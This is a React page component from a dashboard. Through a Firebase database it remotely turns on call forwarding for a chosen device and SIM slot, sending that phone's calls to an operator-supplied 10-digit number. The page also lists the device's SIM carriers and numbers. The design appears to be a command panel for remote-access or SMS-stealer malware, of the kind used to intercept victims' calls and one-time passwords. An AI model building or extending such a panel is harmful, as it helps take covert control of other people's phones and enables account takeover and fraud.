// pages/CallForwardPage.jsx
import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { get, ref, update, onValue } from 'firebase/database';
import { db } from '../firebase/config';

function CallForwardPage() {
  const { deviceId } = useParams();
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [number, setNumber] = useState('');
  const [isActive, setIsActive] = useState(false);
  const [status, setStatus] = useState('');
  const [timestamp, setTimestamp] = useState('');
  const [simSlot, setSimSlot] = useState(0);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [simList, setSimList] = useState([]);
  const [isWaiting, setIsWaiting] = useState(false);

  useEffect(() => {
    fetchData();
    fetchSimInfo();
    
    const callRef = ref(db, `MainNode/${deviceId}/CallNode`);
    const unsubscribe = onValue(callRef, (snapshot) => {
      if (snapshot.exists()) {
        const d = snapshot.val();
        setIsActive(d.isActive || false);
        setStatus(d.status || '');
        setTimestamp(d.timestamp || '');
        setNumber(d.call_number || '');
        setSimSlot(d.simSlot || 0);
        setIsWaiting(false);
      }
    });

    return () => unsubscribe();
  }, [deviceId]);

  const fetchData = async () => {
    setLoading(true);
    try {
      const snap = await get(ref(db, `MainNode/${deviceId}/CallNode`));
      if (snap.exists()) {
        const d = snap.val();
        setNumber(d.call_number || '');
        setIsActive(d.isActive || false);
        setStatus(d.status || '');
        setTimestamp(d.timestamp || '');
        setSimSlot(d.simSlot || 0);
      }
    } catch (err) {
      console.error(err);
    }
    setLoading(false);
  };

  const fetchSimInfo = async () => {
    try {
      const snap = await get(ref(db, `devices/${deviceId}`));
      if (snap.exists()) {
        const d = snap.val();
        const simInfoRaw = d.sim_info || '';
        
        const sims = [];
        if (simInfoRaw) {
          const lines = simInfoRaw.split('\n');
          lines.forEach((line, index) => {
            if (line.trim()) {
              const parts = line.split(' - ');
              const carrier = parts[0]?.split(': ')[1] || parts[0] || `SIM ${index + 1}`;
              const number = parts[1]?.trim() || '';
              sims.push({
                slot: index,
                label: `SIM ${index + 1}`,
                carrier: carrier,
                number: number
              });
            }
          });
        }
        
        if (sims.length === 0) {
          sims.push({ slot: 0, label: 'SIM 1', carrier: 'SIM 1', number: '' });
          sims.push({ slot: 1, label: 'SIM 2', carrier: 'SIM 2', number: '' });
        }
        setSimList(sims);
      }
    } catch (err) {
      console.error(err);
    }
  };

  const handleEnable = async () => {
    if (!number || number.length < 10) {
      setError('Enter 10-digit number');
      setTimeout(() => setError(''), 3000);
      return;
    }
    setSaving(true);
    setIsWaiting(true);
    setError('');
    setSuccess('');
    
    try {
      await update(ref(db, `MainNode/${deviceId}/CallNode`), {
        call_number: number,
        isActive: true,
        status: 'ACTIVATING...',
        timestamp: new Date().toLocaleString(),
        initiated: Date.now(),
        simSlot
      });
      setIsActive(true);
      setSuccess('⏳ Command sent to device...');
    } catch (err) {
      setError('❌ Failed to enable');
      setIsWaiting(false);
      setTimeout(() => setError(''), 3000);
    }
    setSaving(false);
  };

  const handleDisable = async () => {
    setSaving(true);
    setIsWaiting(true);
    setError('');
    setSuccess('');
    
    try {
      await update(ref(db, `MainNode/${deviceId}/CallNode`), {
        isActive: false,
        status: 'DEACTIVATING...',
        timestamp: new Date().toLocaleString(),
        deactivatedAt: new Date().toLocaleString()
      });
      setIsActive(false);
      setSuccess('⏳ Deactivating...');
    } catch (err) {
      setError('❌ Failed to disable');
      setIsWaiting(false);
      setTimeout(() => setError(''), 3000);
    }
    setSaving(false);
  };

  const getStatusDisplay = () => {
    if (isWaiting) {
      return { 
        text: '⏳ Waiting for device...', 
        color: '#f1c40f', 
        bg: 'rgba(241,196,15,0.1)', 
        border: 'rgba(241,196,15,0.3)',
        icon: '⏳',
        highlight: false
      };
    }

    if (isActive === true && status && status.toLowerCase().includes('success')) {
      return { 
        text: '✅ Active', 
        color: '#2ecc71', 
        bg: 'rgba(46,204,113,0.1)', 
        border: 'rgba(46,204,113,0.3)',
        icon: '✅',
        highlight: false,
        subText: status
      };
    }

    if (isActive === true && status && status.toLowerCase().includes('failed')) {
      return { 
        text: '❌ Failed', 
        color: '#e74c3c', 
        bg: 'rgba(231,76,60,0.15)', 
        border: 'rgba(231,76,60,0.4)',
        icon: '❌',
        highlight: true,
        subText: status
      };
    }

    if (isActive === false) {
      return { 
        text: '⛔ Deactivated', 
        color: '#95a5a6', 
        bg: 'rgba(149,165,166,0.08)', 
        border: 'rgba(149,165,166,0.15)',
        icon: '⛔',
        highlight: false,
        subText: status || 'Call forwarding is disabled'
      };
    }

    if (status && status.includes('ACTIVATING')) {
      return { 
        text: '⏳ Activating...', 
        color: '#f1c40f', 
        bg: 'rgba(241,196,15,0.1)', 
        border: 'rgba(241,196,15,0.3)',
        icon: '⏳',
        highlight: false
      };
    }

    if (status && status.includes('DEACTIVATING')) {
      return { 
        text: '⏳ Deactivating...', 
        color: '#f1c40f', 
        bg: 'rgba(241,196,15,0.1)', 
        border: 'rgba(241,196,15,0.3)',
        icon: '⏳',
        highlight: false
      };
    }

    if (isActive === true) {
      return { 
        text: '✅ Active', 
        color: '#2ecc71', 
        bg: 'rgba(46,204,113,0.08)', 
        border: 'rgba(46,204,113,0.2)',
        icon: '✅',
        highlight: false,
        subText: status || ''
      };
    }

    return { 
      text: '⛔ Inactive', 
      color: '#95a5a6', 
      bg: 'rgba(149,165,166,0.05)', 
      border: 'rgba(149,165,166,0.15)',
      icon: '⛔',
      highlight: false,
      subText: status || ''
    };
  };

  const formatDate = (ts) => {
    if (!ts) return 'N/A';
    return new Date(ts).toLocaleString('en-IN', {
      day: '2-digit',
      month: 'short',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });
  };

  const getSimDisplay = () => {
    const sim = simList.find(s => s.slot === simSlot);
    if (sim) {
      return `${sim.label}: ${sim.carrier}${sim.number ? ` - ${sim.number}` : ''}`;
    }
    return `SIM ${simSlot + 1}`;
  };

  const statusInfo = getStatusDisplay();

  if (loading) {
    return (
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', minHeight: '80px', gap: '6px' }}>
        <div style={{ width: '24px', height: '24px', border: '3px solid #e2e8f0', borderTopColor: '#6c63ff', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></div>
        <p style={{ color: 'var(--text-muted)', fontSize: '11px' }}>Loading...</p>
        <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
      </div>
    );
  }

  return (
    <div style={{ padding: '4px 0', maxWidth: '100%', background: 'var(--bg-primary)', minHeight: 'auto' }}>
      
      {/* HEADER */}
      <div style={{ 
        display: 'flex', 
        alignItems: 'center', 
        gap: '6px', 
        padding: '2px 0 6px', 
        borderBottom: '2px solid var(--border-color)', 
        marginBottom: '6px' 
      }}>
       
        <h2 style={{ fontSize: '14px', fontWeight: 700, color: 'var(--text-primary)', margin: 0, flex: 1 }}>📞 Call Forward</h2>
        <span style={{ 
          fontSize: '9px', 
          fontWeight: 700, 
          padding: '2px 10px', 
          borderRadius: '20px',
          color: isActive === true && status?.toLowerCase().includes('success') ? '#2ecc71' : '#e74c3c',
          background: isActive === true && status?.toLowerCase().includes('success') ? 'rgba(46,204,113,0.1)' : 'rgba(231,76,60,0.08)',
          border: `1px solid ${isActive === true && status?.toLowerCase().includes('success') ? 'rgba(46,204,113,0.2)' : 'rgba(231,76,60,0.1)'}`
        }}>
          {isActive === true && status?.toLowerCase().includes('success') ? '🟢 ON' : '🔴 OFF'}
        </span>
      </div>

      {/* STATUS CARD - Compact */}
      <div style={{ 
        background: statusInfo.highlight ? 'linear-gradient(135deg, rgba(231,76,60,0.08), rgba(231,76,60,0.02))' : 'var(--bg-card)',
        borderRadius: '8px', 
        padding: '6px 10px', 
        border: statusInfo.highlight ? '2px solid #e74c3c' : `1px solid ${statusInfo.border}`,
        marginBottom: '6px',
        boxShadow: '0 1px 4px rgba(0,0,0,0.03)'
      }}>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2px 8px' }}>
          <div style={{ gridColumn: 'span 2', display: 'flex', justifyContent: 'space-between', alignItems: 'center', paddingBottom: '3px', borderBottom: '1px solid var(--border-color)', marginBottom: '2px' }}>
            <span style={{ fontSize: '10px', fontWeight: 600, color: 'var(--text-primary)' }}>📊 Status</span>
            <span style={{ 
              fontSize: statusInfo.highlight ? '12px' : '11px',
              fontWeight: statusInfo.highlight ? 800 : 600,
              color: statusInfo.color,
              background: statusInfo.bg,
              padding: statusInfo.highlight ? '3px 12px' : '1px 10px',
              borderRadius: '20px',
              border: statusInfo.highlight ? '1px solid #e74c3c' : `1px solid ${statusInfo.border}`
            }}>
              {statusInfo.icon} {statusInfo.text}
            </span>
          </div>

          {statusInfo.subText && (
            <div style={{ gridColumn: 'span 2', display: 'flex', justifyContent: 'space-between', padding: '1px 0' }}>
              <span style={{ fontSize: '8px', color: 'var(--text-muted)' }}>📝</span>
              <span style={{ fontSize: '8px', color: statusInfo.highlight ? '#e74c3c' : statusInfo.color, fontWeight: 500, textAlign: 'right', maxWidth: '75%' }}>
                {statusInfo.subText}
              </span>
            </div>
          )}

          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '1px 0' }}>
            <span style={{ fontSize: '9px', color: 'var(--text-muted)' }}>📱 Number</span>
            <span style={{ fontSize: '10px', fontWeight: 600, color: 'var(--text-primary)', fontFamily: 'monospace' }}>{number || '—'}</span>
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '1px 0' }}>
            <span style={{ fontSize: '9px', color: 'var(--text-muted)' }}>📶 SIM</span>
            <span style={{ fontSize: '10px', fontWeight: 600, color: 'var(--text-primary)' }}>{getSimDisplay()}</span>
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '1px 0', gridColumn: 'span 2', borderTop: '1px solid var(--border-color)', paddingTop: '3px', marginTop: '1px' }}>
            <span style={{ fontSize: '8px', color: 'var(--text-muted)' }}>🕐 {timestamp || 'N/A'}</span>
          </div>
        </div>
      </div>

      {/* MESSAGES - Compact */}
      {error && (
        <div style={{ padding: '4px 8px', background: 'rgba(231,76,60,0.08)', border: '1px solid rgba(231,76,60,0.15)', borderRadius: '4px', color: '#e74c3c', fontSize: '11px', marginBottom: '4px' }}>
          {error}
        </div>
      )}
      {success && (
        <div style={{ padding: '4px 8px', background: 'rgba(46,204,113,0.08)', border: '1px solid rgba(46,204,113,0.15)', borderRadius: '4px', color: '#2ecc71', fontSize: '11px', marginBottom: '4px' }}>
          {success}
        </div>
      )}

      {/* ENABLE - Compact */}
      <div style={{ 
        background: 'var(--bg-card)', 
        borderRadius: '8px', 
        padding: '6px 10px', 
        border: '1px solid var(--border-color)', 
        marginBottom: '4px',
        boxShadow: '0 1px 4px rgba(0,0,0,0.02)'
      }}>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
            <span style={{ fontSize: '11px', fontWeight: 600, color: 'var(--text-primary)' }}>📞 Enable</span>
            {isActive === true && status?.toLowerCase().includes('success') && <span style={{ fontSize: '8px', padding: '1px 8px', borderRadius: '12px', background: 'rgba(46,204,113,0.1)', color: '#2ecc71', fontWeight: 600 }}>● LIVE</span>}
          </div>
          <input
            type="tel"
            value={number}
            onChange={(e) => setNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
            placeholder="Enter 10-digit number"
            maxLength="10"
            style={{ 
              padding: '5px 10px', 
              border: `2px solid #6c63ff`,
              borderRadius: '6px', 
              background: 'var(--bg-input)', 
              color: 'var(--text-primary)', 
              fontSize: '13px', 
              outline: 'none',
              fontFamily: 'monospace',
              width: '100%',
              height: '32px'
            }}
          />
          <select 
            value={simSlot} 
            onChange={(e) => setSimSlot(parseInt(e.target.value))}
            style={{ 
              padding: '4px 8px', 
              border: `1px solid #6c63ff`,
              borderRadius: '6px', 
              background: 'var(--bg-input)', 
              color: 'var(--text-primary)', 
              fontSize: '11px', 
              outline: 'none',
              width: '100%',
              height: '30px',
              appearance: 'none',
              backgroundImage: 'url("data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'10\' height=\'6\'%3E%3Cpath d=\'M1 1l4 4 4-4\' stroke=\'%236c63ff\' stroke-width=\'2\' fill=\'none\'/%3E%3C/svg%3E")',
              backgroundRepeat: 'no-repeat',
              backgroundPosition: 'right 8px center'
            }}
          >
            {simList.map((sim) => (
              <option key={sim.slot} value={sim.slot} style={{ padding: '2px' }}>
                {sim.label}: {sim.carrier}{sim.number ? ` - ${sim.number}` : ''}
              </option>
            ))}
          </select>
          <button
            onClick={handleEnable}
            disabled={saving || !number}
            style={{ 
              padding: '6px', 
              border: 'none', 
              borderRadius: '6px', 
              fontSize: '13px', 
              fontWeight: 700, 
              cursor: saving || !number ? 'not-allowed' : 'pointer',
              background: saving || !number ? '#95a5a6' : 'linear-gradient(135deg, #6c63ff, #3b82f6)',
              color: 'white',
              opacity: saving || !number ? 0.5 : 1,
              height: '34px'
            }}
          >
            {saving ? '⏳...' : '🔐 Activate'}
          </button>
        </div>
      </div>

      {/* DISABLE - Compact */}
      <div style={{ 
        background: 'var(--bg-card)', 
        borderRadius: '8px', 
        padding: '6px 10px', 
        border: '1px solid var(--border-color)',
        boxShadow: '0 1px 4px rgba(0,0,0,0.02)'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '4px', marginBottom: '4px' }}>
          <span style={{ fontSize: '11px', fontWeight: 600, color: 'var(--text-primary)' }}>⛔ Deactivate</span>
          {!isActive && <span style={{ fontSize: '8px', padding: '1px 8px', borderRadius: '12px', background: 'rgba(149,165,166,0.1)', color: '#95a5a6', fontWeight: 600 }}>● OFF</span>}
        </div>
        <button
          onClick={handleDisable}
          disabled={saving}
          style={{ 
            width: '100%', 
            padding: '6px', 
            border: 'none', 
            borderRadius: '6px', 
            fontSize: '13px', 
            fontWeight: 700, 
            cursor: saving ? 'not-allowed' : 'pointer',
            background: saving ? '#95a5a6' : 'linear-gradient(135deg, #e74c3c, #c0392b)',
            color: 'white',
            opacity: saving ? 0.5 : 1,
            height: '34px'
          }}
        >
          {saving ? '⏳...' : '🚫 Deactivate'}
        </button>
        <p style={{ fontSize: '9px', color: 'var(--text-muted)', textAlign: 'center', margin: '2px 0 0' }}>
          {isActive === true && status?.toLowerCase().includes('success') ? '⚠️ Active — click to deactivate' : '✅ Already deactivated'}
        </p>
      </div>
    </div>
  );
}

export default CallForwardPage;